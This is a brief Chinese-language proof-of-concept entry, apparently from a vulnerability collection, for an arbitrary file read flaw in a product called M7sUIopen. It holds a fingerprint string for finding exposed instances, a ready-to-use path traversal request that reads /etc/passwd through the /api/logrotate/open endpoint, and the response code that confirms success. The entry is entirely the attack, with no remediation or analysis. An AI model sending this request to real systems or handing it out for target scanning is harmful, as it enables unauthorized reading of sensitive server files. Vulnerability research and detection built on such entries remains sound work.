# M7sUIopen存在任意文件读取漏洞

M7sUIopen ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="static/js/chunk-libs.9540f991.js"`
- **请求**：`GET /api/logrotate/open?file=../../../../../../../../../../../etc/passwd HTTP/1.1`
- **响应特征**：200